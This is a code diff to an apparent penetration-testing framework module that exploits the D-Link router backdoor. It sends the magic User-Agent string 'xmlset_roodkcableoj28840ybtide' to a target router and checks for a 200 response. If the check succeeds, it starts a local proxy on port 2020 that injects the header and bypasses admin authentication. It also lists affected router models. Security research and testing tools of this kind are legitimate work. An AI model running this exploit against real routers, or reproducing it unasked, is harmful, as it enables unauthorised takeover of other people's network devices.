@@ -10,18 +10,11 @@ class dlink_backdoor(RouterVuln):
     """ Checks router to see if it is vunerable to the D-Link backdoor 
     """
     def __init__(self):
-        super(dlink_backdoor, self).__init__("D-Link Backdoor")
+        super(dlink_backdoor, self).__init__()
+        self.router = 'D-Link various (check module info)'
+        self.vuln   = 'Remote authentication bypass'
         self.proxy_server = None
-        self.config.update({"target_ip":Zoption(type = "ip",
-                                               value = None,
-                                            required = True,
-                                             display = "Target IP address"),
-                            "local_port":Zoption(type = "port",
-                                                value = "2020",
-                                                required = False,
-                                                display = "Local port to open proxy on")
-                            })
-        self.dlinkproxy = None
+        self.dlinkproxy  = None
         self.proxyserver = None
         self.info = """
         D-Link have serverl vulnerable firmware versions in their routers
@@ -34,13 +27,17 @@ class dlink_backdoor(RouterVuln):
 
         This module will check the target to see if the User-Agent string
         allows bypassing directly to the admin menu. If so, the module will
-        start a local proxy with the User-Agent automatically applied."""
+        start a local proxy on port 2020 with the User-Agent automatically
+        applied.
 
-    def initialize(self):
+        Modules effected:
+        DIR-100, DIR-120, DI-624S, DI-524UP, DI-604S, DI-604UP, DI-604+,
+        TM-G5240, BRL-04R, BRL-04UR, BRL-04CW"""
+
+    def run(self):
         self.running = True
         util.Msg('Checking to see if target is vulnerable...')
-
-        url = 'http://' + self.config["target_ip"].value
+        url = 'http://' + self.ip
         headers = { 'User-Agent' : 'xmlset_roodkcableoj28840ybtide'}
         request = urllib2.Request(url, None, headers)
         response = None
@@ -52,35 +49,32 @@ class dlink_backdoor(RouterVuln):
             result = e.reason
         finally:
             if result is "":
-                result = response.getcode()
+                result = str(response.getcode())
 
             if "Unauth" in result:
                 vuln = False
                 util.Msg("Target is not vulnerable")
-                self.shutdown()
             elif "200" in result:
                 vuln = True
                 util.Msg('Vulnerable! Creating proxy...')
             else:
                 util.Msg("Status codes 401 or 200 not present")
                 util.Msg("Error:" + result)
-                self.shutdown()
 
         if vuln:
-            util.Msg('Creating proxy...')
+            util.Msg('Creating proxy on port 2020...')
             config = proxy.ProxyConfig(transparent_proxy=dict(
                                                 resolver = platform.resolver(),
                                                 sslports = [443]))
             config.skip_cert_cleanup = False
-            self.proxy_server = proxy.ProxyServer(config,
-                                    int(self.config["local_port"].value))
+            self.proxy_server = proxy.ProxyServer(config, 2020)
             self.dlinkproxy = DlinkProxy(self.proxy_server)
-
             thread = Thread(target=self.dlinkproxy.run)
             thread.start()
-	    return True
-       else:
-           return False
+        else:
+            self.shutdown()
+
+        return True 
 
     def shutdown(self):
         """ Shuts down the module safely
@@ -95,8 +89,7 @@ class dlink_backdoor(RouterVuln):
     def session_view(self):
         """ Return the host targeted, and local proxy
         """
-        return self.config["local_port"].value + '->' + \
-               self.config["target_ip"].value
+        return 'Port 2020 ->' + self.ip
 
 class DlinkProxy(controller.Master):
     """ Request handler for libmproxy; takes care of our
